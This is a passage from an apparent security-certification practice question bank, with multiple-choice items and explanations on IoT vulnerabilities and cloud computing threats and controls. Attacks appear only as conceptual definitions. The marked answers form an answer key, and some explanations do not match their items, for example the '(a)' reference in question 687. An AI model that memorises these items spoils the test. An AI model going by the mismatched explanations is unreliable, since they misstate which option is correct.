            <p><span style="color: black; font-family: Calibri, sans-serif;">Maintain SSL/TLS implementations</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Not to use proprietary encryption solutions</span></p>
            </td>
        </tr>
    </tbody>
</table>

682. Secure update server, verify updates before installation, and sign updates are the solutions for which of the following IoT device vulnerabilities?
+ [ ] Insecure cloud interface
+ [ ] Privacy concerns
+ [x] Insecure software / firmware
+ [ ] Insecure network services
> **Explanation:**
> 
<p><span style="text-align: left;"></span></p>
<table width="604" cellspacing="0" cellpadding="0" border="0">
    <tbody>
        <tr style="height: 33pt;">
            <td style="height: 33pt; width: 165.75pt; padding: 5pt; border: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">IoT Device Vulnerabilities</span></strong></p>
            </td>
            <td style="height: 33pt; width: 287.25pt; padding: 5pt; border-top: 1pt solid black; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Solutions</span></strong></p>
            </td>
        </tr>
        <tr style="height: 63pt;">
            <td style="height: 63pt; width: 165.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">1. Insecure Network Services</span></strong></p>
            </td>
            <td style="height: 63pt; width: 287.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-family: Calibri, sans-serif;">Close open network ports</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Disable UPnP</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Review network services for vulnerabilities</span></p>
            </td>
        </tr>
        <tr style="height: 76pt;">
            <td style="height: 76pt; width: 165.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">2. Privacy Concerns</span></strong></p>
            </td>
            <td style="height: 76pt; width: 287.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-family: Calibri, sans-serif;">Minimize data collection</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Anonymize collected data</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Providing end users the ability to decide what data is collected</span></p>
            </td>
        </tr>
        <tr style="height: 63pt;">
            <td style="height: 63pt; width: 165.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">3. Insecure Cloud Interface</span></strong></p>
            </td>
            <td style="height: 63pt; width: 287.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-family: Calibri, sans-serif;">Conduct assessment of all the cloud interfaces</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Use strong and complex password</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Enable two-factor authentication</span></p>
            </td>
        </tr>
        <tr style="height: 63pt;">
            <td style="height: 63pt; width: 165.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">4. Insecure Software / Firmware</span></strong></p>
            </td>
            <td style="height: 63pt; width: 287.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-family: Calibri, sans-serif;">Secure update servers</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Verify updates before installation</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Sign updates</span></p>
            </td>
        </tr>
    </tbody>
</table>
<br>

683. An attacker can perform attacks such as CSRF, SQLi, and XSS attack by exploiting which of the following IoT device vulnerability?
+ [ ] Insecure cloud interface
+ [ ] Insecure software/firmware
+ [ ] Insecure network services
+ [x] Insecure web interface
> **Explanation:**
> 
<p>&nbsp;</p>
<table width="604" cellspacing="0" cellpadding="0" border="0">
    <tbody>
        <tr style="height: 33pt;">
            <td style="height: 33pt; width: 165.75pt; padding: 5pt; border: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">IoT Device Vulnerabilities</span></strong></p>
            </td>
            <td style="height: 33pt; width: 287.25pt; padding: 5pt; border-top: 1pt solid black; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">Obstacles</span></strong></p>
            </td>
        </tr>
        <tr style="height: 63pt;">
            <td style="height: 63pt; width: 165.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">1. Insecure Web Interface</span></strong></p>
            </td>
            <td style="height: 63pt; width: 287.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-family: Calibri, sans-serif;">Default credentials</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;"><g class="gr_ gr_32 gr-alert gr_gramm gr_inline_cards gr_run_anim Grammar only-ins doubleReplace replaceWithoutSep" id="32" data-gr-id="32">Absence</g> of account lockout mechanism</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">CSRF, SQLi, XSS vulnerabilities</span></p>
            </td>
        </tr>
        <tr style="height: 55pt;">
            <td style="height: 55pt; width: 165.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">2. Insecure Cloud Interface</span></strong></p>
            </td>
            <td style="height: 55pt; width: 287.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-family: Calibri, sans-serif;">No review of interfaces for security vulnerabilities</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Presence of weak passwords</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;"><g class="gr_ gr_33 gr-alert gr_gramm gr_inline_cards gr_run_anim Grammar only-ins doubleReplace replaceWithoutSep" id="33" data-gr-id="33">Absence</g> of two-factor authentication</span></p>
            </td>
        </tr>
        <tr style="height: 63pt;">
            <td style="height: 63pt; width: 165.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">3. Insecure Network Services</span></strong></p>
            </td>
            <td style="height: 63pt; width: 287.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-family: Calibri, sans-serif;">Vulnerable to Denial-of-Service attack</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Exposed ports via UPnP</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Unwanted ports are open</span></p>
            </td>
        </tr>
        <tr style="height: 63pt;">
            <td style="height: 63pt; width: 165.75pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: 1pt solid black; text-align: left;" valign="top">
            <p><strong><span style="color: black; font-family: Calibri, sans-serif;">4. Insecure Software / Firmware</span></strong></p>
            </td>
            <td style="height: 63pt; width: 287.25pt; padding: 5pt; border-top: none; border-right: 1pt solid black; border-bottom: 1pt solid black; border-left: none; text-align: left;" valign="top">
            <p><span style="color: black; font-family: Calibri, sans-serif;">Insecure update servers</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Transmission of unencrypted device updates</span></p>
            <p><span style="color: black; font-family: Calibri, sans-serif;">Unsigned device updates</span></p>
            </td>
        </tr>
    </tbody>
</table>

# 19. Cloud Computing
## Cloud Computing Concepts
686. Which of the following types of cloud platforms is most secure?
+ [ ] Internal
+ [ ] Hybrid
+ [ ] Public
+ [x] Private
> **Explanation:**
> A private cloud platform is the most secure as it is owned and maintained by a single entity that has the flexibility of the cloud but the security and control of hosting on-premise.
> 
> Public/hybrid/internal cloud platforms are not correct answers because they are not as secure.

687. Which of the following three service models are the standard cloud service models?
+ [ ] Private, Public, and Community
+ [ ] SaaS, IaaS, and Hybrid
+ [x] SaaS, PaaS, and IaaS
+ [ ] XaaS, Private, and Public
> **Explanation:**
> (a) is the only selection with the all of the correct cloud service models.
> 
> (b)–(d) do not contain the three correct cloud service models; they contain one or two plus a cloud deployment type.

688. You are a security engineer for XYZ Inc. Your company is based on a private cloud infrastructure and discovers a potential breach through a vulnerability that was not properly patched. XYZ Inc. wants to perform a root cause analysis and discover if any data was exfiltrated and if so, what type of information did it contain? How would XYZ Inc. find out this information?
+ [ ] Penetration Testing
+ [ ] Vulnerability Scanning
+ [x] Cloud Forensics
+ [ ] Data Analysis
> **Explanation:**
> + Cloud forensics is correct due to the nature of where the data is being stored.  
> + Data analysis would not uncover the necessary information needed for XYZ Inc.  
> + Vulnerability scanning would only give a report of the vulnerabilities present in the private cloud that could have been the means to exfiltrate the data.  
> + Penetration testing is not correct because XYZ Inc. is not trying to test their systems.

689. You are a security engineer for XYZ Corp. You are looking for a cloud-based e-mail provider to migrate the company’s legacy on-premise e-mail system to. What type of cloud service model will the new e-mail system be running on?
+ [ ] IaaS
+ [x] SaaS
+ [ ] XaaS
+ [ ] PaaS
> **Explanation:**
> SaaS is correct because you are purchasing the use of software that is based in the cloud.
> 
> IaaS/PaaS/XaaS are not correct because they either have different uses or are not an existing cloud service model.

690. You are a security engineer for a cloud-based startup, XYZ Partners LLC, and they would like you to choose the best platform to run their environment from. The company stores sensitive PII and must be SOC 2 compliant. They would like to run their Windows server VMs and directory services from the cloud. Which of the following services and deployment models would meet the company’s requirements?
+ [x] IaaS and Private
+ [ ] SaaS and Hybrid
+ [ ] XaaS and Community
+ [ ] PaaS and Public
> **Explanation:**
> IaaS allows access to individual VMs to be able to have granular control over everything and a private deployment model ensures that only the individual company’s data is stored on the cloud.
> 
> PaaS and public are not correct, with PaaS not being the correct cloud service model and public not being as secure as private.  
> 
> SaaS and hybrid are not correct, with SaaS not being the correct cloud service model and Hybrid not being as secure as private.  
> 
> XaaS and community is not correct, with XaaS not being the correct cloud service model and community not being as secure as private.

691. Which of the following types of cloud computing services provides virtual machines and other abstracted hardware and operating systems (OSs) which may be controlled through a service API?
+ [ ] PaaS
+ [x] IaaS
+ [ ] SaaS
+ [ ] XaaS
> **Explanation:**
> **Infrastructure-as-a-Service (IaaS):** This cloud computing service enables subscribers to use on demand fundamental IT resources such as computing power, virtualization, data storage, network, and so on. This service provides virtual machines and other abstracted hardware and operating systems (OSs) which may be controlled through a service API. As cloud service providers are responsible for managing the underlying cloud-computing infrastructure, subscribers can avoid costs of human capital, hardware, and others (e.g., Amazon EC2, Go grid, Sungrid, Windows SkyDrive, Rackspace.com, etc.).  
> 
> **Platform-as-a-Service (PaaS):** This type of cloud computing service offers the platform for the development of applications and services. Subscribers need not to buy and manage the software and infrastructure underneath it but have authority over deployed applications and perhaps application hosting environment configurations. This offers development tools, configuration management, and deployment platforms on-demand that can be used by subscribers to develop custom applications (E.g., Intel MashMaker, Google App Engine, Force.com, Microsoft Azure, etc.).  
> 
> **Software-as-a-Service (SaaS):** This cloud computing service offers application software to subscribers on demand over the Internet; the provider charges for it on a pay-per-use basis, by subscription, by advertising, or by sharing among multiple users (E.g. web-based office applications like Google Docs or Calendar, Salesforce CRM, Freshbooks, Basecamp, etc.).  
> 
> **Anything-as-a-Service (XaaS):** It is also known as everything-as-a-service. It includes all the other types of cloud services.

692. In which of the following cloud deployment models does the provider make services such as applications, servers, and data storage available to the public over the Internet?
+ [x] Public Cloud
+ [ ] Hybrid Cloud
+ [ ] Private Cloud
+ [ ] Community Cloud
> **Explanation:**
> **Public Cloud:** In this model, the provider makes services such as applications, servers, and data storage available to the public over the Internet. In this model, the cloud provider is liable for the creation and constant maintenance of the public cloud and its IT resources.  
> 
> **Private Cloud:** A private cloud, also known as internal or corporate cloud, is a cloud infrastructure that a single organization operates solely.  
> 
> **Community Cloud:** It is a multi-tenant infrastructure shared among organizations from a specific community with common computing concerns such as security, regulatory compliance, performance requirements, and jurisdiction.  
> 
> **Hybrid Cloud:** It is a cloud environment comprised of two or more clouds (private, public, or community) that remain unique entities, but are bound together for offering the benefits of multiple deployment models.

693. Which of the following NIST cloud reference architecture factors manages cloud services in terms of use, performance, and delivery, and who also maintains a relationship between cloud providers and consumers?
+ [ ] Cloud Provider
+ [ ] Cloud Carrier
+ [x] Cloud Broker
+ [ ] Cloud Consumer
> **Explanation:**
> **Cloud Consumer:** A cloud consumer is a person or organization that maintains a business relationship with cloud service providers and uses cloud computing services. The cloud consumer browses the CSP’s service catalog requests for the desired services, sets up service contracts with the CSP (either directly or via cloud broker) and uses the service.  
> 
> **Cloud Provider:** A cloud provider is a person or organization who acquires and manages the computing infrastructure intended for providing services (directly or via a cloud broker) to interested parties via network access.  
> 
> **Cloud Broker:** Integration of cloud services is becoming too complicated for cloud consumers to manage. Thus, a cloud consumer may request cloud services from a cloud broker, rather than directly contacting a CSP. The cloud broker is an entity that manages cloud services regarding use, performance, and delivery, and maintains the relationship between CSPs and cloud consumers.  
> 
> **Cloud Carrier:** A cloud carrier acts as an intermediary that provides connectivity and transport services between CSPs and cloud consumers. The cloud carrier provides access to consumers via a network, telecommunication, and other access devices.

694. Which of the following is not a characteristic of virtualization in cloud computing technology?
+ [ ] Partitioning
+ [ ] Isolation
+ [ ] Encapsulation
+ [x] Storage
> **Explanation:**
> Partitioning, isolation, and encapsulation are the characteristics of virtualization in cloud computing technology.
> 
> Storage is not a characteristic of virtualization in cloud computing technology, as it is a type of virtualization.

695. Out of the following types of virtualizations, which type of virtualization is used in increasing space utilization and reducing the hardware maintenance cost?
+ [ ] Storage Virtualization
+ [ ] Resource Virtualization
+ [ ] Network Virtualization
+ [x] Server Virtualization
> **Explanation:**
> **Types of virtualization**  
> 1) **Storage Virtualization**  
> + It combines storage devices from multiple networks into a single storage device and helps in:  
> + Expanding the storage capacity  
> + Making changes to store configuration easy
> 
> 2) **Network Virtualization**  
> + It combines all network resources, both hardware, and software into a single virtual network and is used to:  
> + Optimize reliability and security  
> + Improves network resource usage
> 
> 3) **Server Virtualization**  
> + It splits a physical server into multiple smaller virtual servers. Storage utilization is used to:  
> + Increase the space utilization  
> + Reduces the hardware maintenance cost
> 
> 4) **Resource Virtualization**  
> + It is not a type of virtualization.


## Cloud Computing Threats and Attacks
696. Which of the following is not a legitimate cloud computing attack?
+ [ ] Man-In- The-Middle (MiTM)
+ [ ] Denial-Of- Service (DoS)
+ [x] Port Scanning
+ [ ] Privilege Escalation
> **Explanation:**
> Port scanning is correct because it is not an attack. It is used in information gathering. DoS/privilege escalation/MiTM are legitimate attacks because they are generally performed with malice so as to cause damage or steal information from an organization.

697. In which of the following cloud computing threats does an attacker try to control operations of other cloud customers to gain illegal access to the data?
+ [ ] Supply Chain Failure
+ [x] Isolation Failure
+ [ ] Privilege Escalation
+ [ ] Illegal Access to the cloud
> **Explanation:**
> **Isolation Failure:** Multi-tenancy and shared resources are the characteristics of cloud computing. Strong isolation or compartmentalization of storage, memory, routing, and reputation among different tenants is lacking. Because of isolation failure, attackers try to control operations of other cloud customers to gain illegal access to the data.  
> 
> **Privilege Escalation:** A mistake in the access allocation system causes a customer, third party, or employee to get more access rights than needed.  
> 
> **Illegal Access to the cloud:** Attackers can exploit weak authentication and authorization to get illegal access, thereby compromising confidential and critical data stored in the cloud.  
> 
> **Supply Chain Failure:** A disruption in the chain may lead to loss of data privacy and integrity, unavailability of services, violation of SLA, economic and reputational losses resulting in failure to meet customer demand, and cascading failure.

698. An attacker creates anonymous access to the cloud services to carry out various attacks such as password and key cracking, hosting malicious data, and DDoS attack. Which of the following threats is he posing to the cloud platform?
+ [ ] Insecure Interface and APIs
+ [ ] Insufficient due diligence
+ [ ] Data Breach/Loss
+ [x] Abuse and nefarious use of cloud services
> **Explanation:**
> **Abuse and Nefarious Use of Cloud services:** Presence of weak registration systems in the cloud-computing environment gives rise to this threat. Attackers create anonymous access to cloud services and perpetrate various attacks such as password and critical cracking, building rainbow tables, CAPTCHA-solving farms, launching dynamic attack points, hosting exploits on cloud platforms, hosting malicious data, Botnet command or control, DDoS, etc.  
> 
> **Insecure Interface and APIs:** Attackers exploit user defined policies, reusable passwords/tokens, insufficient input-data validation.  
> 
> **Data Breach/Loss:** Attackers gain illegal access to the data and misuse or modify the data.  
> 
> **Insufficient Due Diligence:** Ignorance of CSP’s cloud environment poses risks in operational responsibilities such as security, encryption, incident response, and more issues such as contractual issues, design and architectural issues, etc.

699. A privilege escalation threat is caused due to which of the following weaknesses?
+ [x] A mistake in the access allocation system causes a customer, third party, or employee to get more access rights than needed.
+ [ ] Weak authentication and authorization controls could lead to illegal access thereby compromising confidential and critical data stored in the cloud.
+ [ ] Due to isolation failure, cloud customers can gain illegal access to the data.
+ [ ] Due to flaws while provisioning or de-provisioning networks or vulnerabilities in communication encryption.
> **Explanation:**
> privilege escalation: A mistake in the access allocation system such as coding errors, design flaws, and others can result in a customer, third party, or employee obtaining more access rights than required. This threat arises because of AAA (authentication, authorization, and accountability) vulnerabilities, user-provisioning and de-provisioning vulnerabilities, hypervisor vulnerabilities, unclear roles and responsibilities, misconfiguration, and others.
> 
> Other given weaknesses causes following threats:  
> + Illegal Access to the Cloud: Weak authentication and authorization controls could lead to illegal access thereby compromising confidential and critical data stored in the cloud.  
> + Isolation Failure: Due to isolation failure, cloud customers can gain illegal access to the data.  
> + Modifying Network Traffic: Due to flaws while provisioning or de-provisioning network or vulnerabilities in communication encryption.

700. In which of the following attacks does an attacker steal a CSP’s or client’s credentials by methods such as phishing, pharming, social engineering, and exploitation of software vulnerabilities?
+ [ ] Wrapping Attack
+ [ ] Side Channel Attack
+ [x] Service Hijacking Using Social Engineering Attacks
+ [ ] DNS Attack
> **Explanation:**
> **Service Hijacking Using Social Engineering Attacks:** In account or service hijacking, an attacker steals a CSP’s or client’s credentials by methods such as phishing, pharming, social engineering, and exploitation of software vulnerabilities. Using the stolen credentials, the attacker gains access to the cloud computing services and compromises data confidentiality, integrity, and availability.  
> 
> **Wrapping Attack:** It is performed during the translation of SOAP messages in the TLS layer, where attackers duplicate the body of the message and send it to the server as a legitimate user.  
> 
> **DNS Attack:** The attacker performs DNS attacks to obtain authentication credentials from Internet users.  
> 
> **Side Channel Attack:** The attacker compromises the cloud by placing a malicious virtual machine near a target cloud server and then launches a side channel attack.

701. An attacker runs a virtual machine on the same physical host as the victim’s virtual machine and takes advantage of shared physical resources (processor cache) to steal data (cryptographic key) from the victim. Which of the following attacks he is performing?
+ [ ] Cryptanalysis Attack
+ [ ] XSS Attack
+ [ ] MITC Attack
+ [x] Side Channel Attack
> **Explanation:**
> **Side Channel Attack:** Attacker compromises the cloud by placing a malicious virtual machine near a target cloud server and then launch side channel attack. Inside channel attack, the attacker runs a virtual machine on the same physical host of the victim’s virtual machine and takes advantage of shared physical resources (processor cache) to steal data (cryptographic key) from the victim. Side-channel attacks can be implemented by any co-resident user and are mainly due to the vulnerabilities in shared technology resources.  
> 
> **XSS Attack:** The attacker implements Cross-Site Scripting (XSS) to steal cookies that are used to authenticate users. This involves injecting malicious code into the website that is subsequently executed by the browser.  
> 
> **MITC Attack:** MITC attacks are carried out by abusing cloud file synchronization services such as Google Drive or Dropbox for data compromise, command and control (C&C), data exfiltration, and remote access.  
> 
> **Cryptanalysis Attack:** Attackers exploit flaws present in the cryptography algorithm to carry out cryptanalysis attacks.

702. In which of the following attacks does an attacker ride an active computer session by sending an email or tricking the user into visiting a malicious web page while they are logged into the targeted site?
+ [ ] DNS Attack
+ [ ] Wrapping Attack
+ [x] Session Hijacking Using Session Riding
+ [ ] Side Channel Attack
> **Explanation:**
> **Session Hijacking Using Session Riding:** Attackers exploit websites by engaging in cross-site request forgeries to transmit unauthorized commands. In session riding, attackers “ride” an active computer session by sending an email or tricking users to visit a malicious web page, during login, to an actual target site. When users click the malicious link, the website executes the request as if the user had already authenticated it. Commands used include modifying or deleting user data, performing online transactions, resetting passwords, and others.  
> 
> **Wrapping Attack:** It is performed during the translation of SOAP messages in the TLS layer, where attackers duplicate the body of the message and send it to the server as a legitimate user.  
> 
> **DNS Attack:** The attacker performs DNS attacks to obtain authentication credentials from Internet users.  
> 
> **Side Channel Attack:** The attacker compromises the cloud by placing a malicious virtual machine near a target cloud server and then launches a side channel attack.

703. Which of the following is not a type of DNS attack?
+ [ ] Cybersquatting
+ [ ] Domain Hijacking
+ [ ] Domain Snipping
+ [x] Session Hijacking
> **Explanation:**
> + Domain snipping, domain hijacking, and cybersquatting are various types of DNS attacks.
> + Session hijacking is not a type of DNS attack.

704. Out of the following, which is not a type of side-channel attack?
+ [ ] Timing Attack
+ [ ] Acoustic Cryptanalysis
+ [ ] Data Remanence
+ [x] Cybersquatting
> **Explanation:**
> Attacker compromises the cloud by placing a malicious virtual machine near a target cloud server and then launches side-channel attack. Inside channel attack, the attacker runs a virtual machine on the same physical host of the victim’s virtual machine and takes advantage of shared physical resources (processor cache) to steal data (cryptographic key) from the victim. Side-channel attacks can be implemented by any co-resident user and are mainly due to the vulnerabilities in shared technology resources.  
> 
> Timing attack, data remanence, and acoustic cryptanalysis are types of side-channel attacks, whereas cybersquatting is a type of DNS attack.  
> 
> Cybersquatting involves conducting phishing scams by registering a domain name that is similar to a cloud service provider.

705. In which of the following attacks, does an attacker divert a user to a spoofed website by poisoning the DNS server or the DNS cache on the user’s system?
+ [ ] Domain Hijacking
+ [x] DNS Poisoning
+ [ ] Cybersquatting
+ [ ] Domain Snipping
> **Explanation:**
> **Cybersquatting:** Involves conducting phishing scams by registering a domain name that is similar to a cloud service provider.  
> 
> **Domain hijacking:** Involves stealing a cloud service provider’s domain name.  
> 
> **Domain snipping:** Involves registering an elapsed domain name.


## Cloud Computing Security
706. Identify the services provided by the application layer of the cloud security control model?
+ [ ] Hardware and software RoT and API's
+ [ ] DLP, CMF, Database Activity Monitoring, Encryption
+ [ ] Physical Plant Security, CCTV, Guards
+ [x] SDLC, Binary Analysis, Scanners, Web App Firewalls, Transactional Sec
> **Explanation:**
> **Cloud Security Control Layers**
> **Information Layer**
> Develop and document an information security management program (ISMP), which includes administrative, technical, and physical safeguards to protect information against unauthorized access, modification, or deletion. Some of the information layer security controls include DLP, CMF, database activity monitoring, encryption, etc.  
> 
> **Trusted Computing**
> Trust computing defines secured computational environment that implements internal control, auditability, and maintenance to ensure availability and integrity of cloud operations. Hardware and software RoT & API's are few security controls for trusted computing.  
> 
> **Physical Layer**
> This layer includes security measures for cloud infrastructure, data centers, and physical resources. Security entities that come under this perimeter are physical plant security, fences, walls, barriers, guards, gates, electronic surveillance, CCTV, physical authentication mechanisms, security patrols, and so on.  
> 
> **Application Layer**
> To harden the application layer, establish the policies that match with industry adoption security standards, for example, OWASP for a web application. It should meet and comply with appropriate regulatory and business requirements. Some of the application layer controls include SDLC, binary analysis, scanners, web app firewalls, transactional sec, etc.

707. The components such as NIDS/NIPS, firewalls, DPI, Anti-DDoS, QoS, DNSSEC, and OAuth are included in which of the following cloud security control layers?
+ [ ] Computer and Storage
+ [x] Network Layer
+ [ ] Applications Layer
+ [ ] Management Layer
> **Explanation:**
> **Cloud Security Control Layers**
> **Application Layer**
> To harden the application layer, establish the policies that match with industry adoption security standards, for example, OWASP for a web application. It should meet and comply with appropriate regulatory and business requirements. Some of the application layer controls include SDLC, binary analysis, scanners, web app firewalls, transactional sec, etc.
> 
> **Management Layer**
> This layer covers the cloud security administrative tasks, which can facilitate continued, uninterrupted, and effective services of the cloud. Cloud consumers should look for the above-mentioned policies to avail better services. Some of the management layer security controls include GRC, IAM, VA/VM, patch management, configuration management, monitoring, etc.
> 
> **Network Layer**
> It deals with various measures and policies adopted by a network administrator to monitor and prevent illegal access, misuse, modification, or denial of network-accessible resources. Some of the additional network layer security controls include NIDS/NIPS, firewalls, DPI, anti-DDoS, QoS, DNSSEC, OAuth, etc.
> 
> **Computation and Storage**
> In cloud due to the lack of physical control of the data and the machine, the service provider may be unable to manage the data and computation and lose the trust of the cloud consumers. Cloud provider must establish policies and procedures for data storage and retention. Cloud provider should implement appropriate backup mechanisms to ensure availability and continuity of services that meet with statutory, regulatory, contractual, or business requirements and compliance. Host-based firewalls, HIDS/HIPS, integrity and file/log management, encryption, masking are some security controls in computation and storage.

708. The components such as DLP, CMF, database activity monitoring, and encryption are included in which of the following cloud security control layers?
+ [x] Information Layer
+ [ ] Applications Layer
+ [ ] Computer and Storage
+ [ ] Management Layer
> **Explanation:**
> **Cloud Security Control Layers**
> **Application Layer**
> To harden the application layer, establish the policies that match with industry adoption security standards, for example, OWASP for a web application. It should meet and comply with appropriate regulatory and business requirements. Some of the application layer controls include SDLC, binary analysis, scanners, web app firewalls, transactional sec, etc.
> 
> **Management Layer**
> This layer covers the cloud security administrative tasks, which can facilitate continued, uninterrupted, and effective services of the cloud. Cloud consumers should look for the above-mentioned policies to avail better services. Some of the management layer security controls include GRC, IAM, VA/VM, patch management, configuration management, monitoring, etc.
> 
> **Information Layer**
> Develop and document an information security management program (ISMP), which includes administrative, technical, and physical safeguards to protect information against unauthorized access, modification, or deletion. Some of the information layer security controls include DLP, CMF, database activity monitoring, encryption, etc.
> 
> **Computation and Storage**
> In cloud due to the lack of physical control of the data and the machine, the service provider may be unable to manage the data and computation and lose the trust of the cloud consumers. Cloud provider must establish policies and procedures for data storage and retention. Cloud provider should implement appropriate backup mechanisms to ensure availability and continuity of services that meet with statutory, regulatory, contractual, or business requirements and compliance. Host-based firewalls, HIDS/HIPS, integrity and file/log management, encryption, masking are some security controls in computation and storage.

709. Which of the following mechanisms should be incorporated into the cloud services to facilitate networks and resources to improve the response time of a job with maximum throughput?
+ [x] Load balancing
+ [ ] Two-factor authentication
+ [ ] Lockout mechanism
+ [ ] Encryption mechanism
> **Explanation:**
> Cloud load balancing is the process of distributing workloads and computing resources in a cloud computing environment. Load balancing allows enterprises to manage application or workload demands by allocating resources among multiple computers, networks, or servers. Cloud load balancing involves hosting the distribution of workload traffic and demands that reside over the Internet.

710. Which of the following categories of security controls strengthens the system against incidents by minimizing or eliminating vulnerabilities?
+ [ ] Deterrent Controls
+ [ ] Corrective Controls
+ [ ] Detective Controls
+ [x] Preventive Controls
> **Explanation:**
> **Deterrent Controls:** These controls reduce attacks on the cloud system. Example: Warning sign on the fence or property to inform adverse consequences for potential attackers if they proceed to attack  
> 
> **Preventive Controls:** These controls strengthen the system against incidents, probably by minimizing or eliminating vulnerabilities. Example: Strong authentication mechanism to prevent unauthorized use of cloud systems.  
> 
> **Detective Controls:** These controls detect and react appropriately to the incidents that happen. Example: Employing IDSs, IPSs, etc. helps to detect attacks on cloud systems.  
> 
> **Corrective controls:** These controls minimize the consequences of an incident, probably by limiting the damage. Example: Restoring system backups.

711. Which of the following categories of security controls minimizes the consequences of an incident by limiting the damage?
+ [ ] Preventive Controls
+ [x] Corrective Controls
+ [ ] Deterrent Controls
+ [ ] Detective Controls
> **Explanation:**
> **Deterrent Controls:** These controls reduce attacks on the cloud system. Example: Warning sign on the fence or property to inform adverse consequences for potential attackers if they proceed to attack  
> 
> **Preventive Controls:** These controls strengthen the system against incidents, probably by minimizing or eliminating vulnerabilities. Example: Strong authentication mechanism to prevent unauthorized use of cloud systems.  
> 
> **Detective Controls:** These controls detect and react appropriately to the incidents that happen. Example: Employing IDSs, IPSs, etc. helps to detect attacks on cloud systems.  
> 
> **Corrective controls:** These controls minimize the consequences of an incident, probably by limiting the damage. Example: Restoring system backups.

712. Which of the following protocols is used for secure information passage between two endpoints?
+ [ ] FTP
+ [x] SSL
+ [ ] TCP
+ [ ] UDP
> **Explanation:**
> Secure sockets layer (SSL) is a computer networking protocol for securing connections between network application clients and servers over an insecure network, such as the Internet. However, TCP, UDP, and FTP are a type of network protocol.

713. Which of the following is NOT a best practice for cloud security?
+ [ ] Verify one’s cloud in public domain blacklists
+ [x] Provide unauthorized server access using security checkpoints
+ [ ] Disclose applicable logs and data to customers
+ [ ] Undergo AICPA SAS 70 Type II audits
> **Explanation:**
> Some of the Best Practices for Securing Cloud  
> + Enforce data protection, backup, and retention mechanisms  
> + Enforce SLAs for patching and vulnerability remediation  
> + Vendors should regularly undergo AICPA SAS 70 Type II audits  
> + Verify one’s cloud in public domain blacklists  
> + Enforce legal contracts in employee behavior policy  
> + Prohibit user credentials sharing among users, applications, and services  
> + Implement secure authentication, authorization, and auditing mechanisms  
> + Check for data protection at both design and runtime  
> + Implement strong key generation, storage and management, and destruction practices  
> + Monitor the client’s traffic for any malicious activities  
> + Prevent unauthorized server access using security checkpoints  
> + Disclose applicable logs and data to customers  
> + Analyze cloud provider security policies and SLAs  
> + Assess security of cloud APIs and also log customer network traffic  
> 
> Providing unauthorized server access using security checkpoints is not a good practice however Preventing unauthorized server access using security checkpoints is a good practice for cloud security.

714. Detective security controls detect and react appropriately to the incidents that happen on the cloud system. Which of the following is an example of detective security controls?
+ [x] Employing IDSs and IPSs
+ [ ] Implementing strong authentication mechanism
+ [ ] Restoring system backups
+ [ ] Identifying warning sign on the fence
